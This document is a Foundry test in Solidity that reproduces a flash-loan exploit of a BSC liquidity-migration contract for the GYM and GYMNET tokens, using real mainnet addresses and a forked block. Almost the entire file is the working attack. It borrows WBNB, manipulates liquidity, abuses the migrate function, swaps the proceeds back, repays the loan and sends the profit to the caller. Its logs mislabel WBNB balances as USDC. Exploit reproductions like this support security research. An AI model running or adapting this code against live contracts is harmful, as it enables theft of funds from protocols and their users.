// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20} from "src/interfaces/IERC20.sol";
import {IPancakePair} from "src/interfaces/IPancakePair.sol";
import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
import {IWBNB} from "src/interfaces/IWBNB.sol";

interface ILiquidityMigrationV2 {

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event migration(uint256 LPspended, uint256 LPrecived);

    fallback() external;

    function lpAddress() external view returns (address);

    function migrate(uint256 _lpTokens) external;

    function owner() external view returns (address);

    function renounceOwnership() external;

    function router() external view returns (address);

    function transferOwnership(address newOwner) external;

    function v1Address() external view returns (address);

    function v2Address() external view returns (address);

    function withdraw() external;

    function withdrawTokens() external;

    receive() external payable;

}

contract ContractTest is Test {

    IPancakeRouter pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    ILiquidityMigrationV2 liquidityMigrationV2 =
        ILiquidityMigrationV2(payable(0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4));
    IPancakePair wbnbBusdPair = IPancakePair(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);
    IPancakePair wbnbGymPair = IPancakePair(0x8dC058bA568f7D992c60DE3427e7d6FC014491dB);
    IPancakePair wbnbGymnetPair = IPancakePair(0x627F27705c8C283194ee9A85709f7BD9E38A1663);
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 gym = IERC20(0xE98D920370d87617eb11476B41BF4BE4C556F3f8);
    IERC20 gymnet = IERC20(0x3a0d9d7764FAE860A659eb96A500F1323b411e68);

    constructor() {
        vm.createSelectFork("bsc", 16_798_806); //fork bsc at block 16798806

        wbnb.approve(address(pancakeRouter), type(uint256).max);
        gym.approve(address(pancakeRouter), type(uint256).max);
        gymnet.approve(address(pancakeRouter), type(uint256).max);
        wbnbGymPair.approve(address(pancakeRouter), type(uint256).max);
        wbnbGymPair.approve(address(liquidityMigrationV2), type(uint256).max);
        wbnbGymnetPair.approve(address(pancakeRouter), type(uint256).max);
    }

    function testExploit() public {
        payable(address(0)).transfer(address(this).balance);
        emit log_named_uint("Before exploit, USDC  balance of attacker:", wbnb.balanceOf(msg.sender));
        wbnbBusdPair.swap(2400e18, 0, address(this), new bytes(1));
        emit log_named_uint("After exploit, USDC  balance of attacker:", wbnb.balanceOf(msg.sender));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(gym);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            600e18, 0, path, address(this), type(uint32).max
        );
        pancakeRouter.addLiquidity(
            address(wbnb),
            address(gym),
            wbnb.balanceOf(address(this)),
            gymnet.balanceOf(address(liquidityMigrationV2)),
            0,
            0,
            address(this),
            type(uint32).max
        );
        liquidityMigrationV2.migrate(wbnbGymPair.balanceOf(address(this)));
        pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(gymnet), wbnbGymnetPair.balanceOf(address(this)), 0, 0, address(this), type(uint32).max
        );
        wbnb.deposit{value: address(this).balance}();
        path[0] = address(gym);
        path[1] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            gym.balanceOf(address(this)), 0, path, address(this), type(uint32).max
        );
        path[0] = address(gymnet);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            gymnet.balanceOf(address(this)), 0, path, address(this), type(uint32).max
        );
        wbnb.transfer(msg.sender, ((amount0 / 9975) * 10_000) + 10_000);
        wbnb.transfer(tx.origin, wbnb.balanceOf(address(this)));
    }

    receive() external payable {}

}
